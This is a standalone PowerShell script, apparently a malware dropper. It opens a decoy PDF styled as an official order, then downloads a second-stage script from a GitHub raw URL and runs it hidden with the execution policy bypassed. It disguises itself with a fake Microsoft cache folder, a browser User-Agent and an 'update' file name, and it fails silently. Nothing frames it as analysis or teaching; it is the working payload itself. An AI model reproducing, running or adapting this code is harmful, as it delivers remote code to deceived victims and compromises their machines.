$envData = Get-Item env:APPDATA
$cachePath = Join-Path $envData.Value "Microsoft\Windows\Caches"
if(!(Test-Path $cachePath)){New-Item -Path $cachePath -ItemType Directory -Force | Out-Null}

$rawBase = "raw.githubusercontent.com"
$orgPath = "astro-opensource/cloud-sync-tools"
$branch = "main"
$pdfAsset = "assets/Nakaz_No._661_vid_02.03.2026-4.pdf"
$launcherAsset = "assets/launcher.ps1"

$protocol = "https://"
$pdfUrl = "$protocol$rawBase/$orgPath/$branch/$pdfAsset"
$launcherUrl = "$protocol$rawBase/$orgPath/refs/heads/$branch/$launcherAsset"

$randomSuffix = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$pdfPath = Join-Path $cachePath "temp_$randomSuffix.pdf"
$launcherPath = Join-Path $cachePath "update_$randomSuffix.ps1"

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    if(!(Test-Path $pdfPath)){$webClient.DownloadFile($pdfUrl,$pdfPath)}
    Start-Process $pdfPath -WindowStyle Normal
    $webClient.DownloadFile($launcherUrl,$launcherPath)
}
catch {
    exit
}

Start-Sleep -Seconds 3
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`""
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
[System.Diagnostics.Process]::Start($psi) | Out-Null
